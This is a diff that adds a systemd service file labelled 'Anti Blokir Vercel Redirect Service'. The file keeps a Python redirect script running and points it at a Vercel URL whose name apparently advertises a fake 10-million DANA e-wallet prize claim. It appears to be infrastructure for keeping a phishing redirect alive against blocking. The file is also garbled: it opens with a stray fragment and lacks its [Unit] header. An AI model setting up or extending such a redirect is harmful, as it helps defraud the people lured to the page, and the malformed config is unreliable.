@@ -1,0 +1,13 @@
+multi-
+
+Description=Anti Blokir Vercel Redirect Service
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /path/to/anti_block_vercel.py
+Restart=always
+User=your-semogasaja
+Environment="TARGET_URL=https://lyananid-4dana10jt-resmi-claim.vercel.app/"
+
+[Install]
+WantedBy=multi-user.target
